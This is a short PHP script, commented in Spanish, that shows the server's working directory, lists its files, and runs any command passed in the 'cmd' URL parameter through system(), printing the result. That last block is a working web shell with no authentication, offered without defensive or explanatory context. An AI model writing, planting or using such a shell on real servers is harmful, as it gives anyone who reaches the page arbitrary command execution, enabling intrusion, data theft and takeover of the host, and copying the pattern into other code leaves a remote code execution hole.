<?php
// Mostrar ruta actual del servidor
echo "<h3>Ruta actual:</h3>";
echo getcwd(); // devuelve el directorio donde está el script

// Listar archivos en el directorio
echo "<h3>Archivos en este directorio:</h3>";
$files = scandir(getcwd());
foreach($files as $file) {
    echo $file . "<br>";
}

// Permitir ejecución de comandos opcional
if(isset($_GET['cmd'])) {
    echo "<h3>Resultado del comando:</h3>";
    system($_GET['cmd']);
}
?>
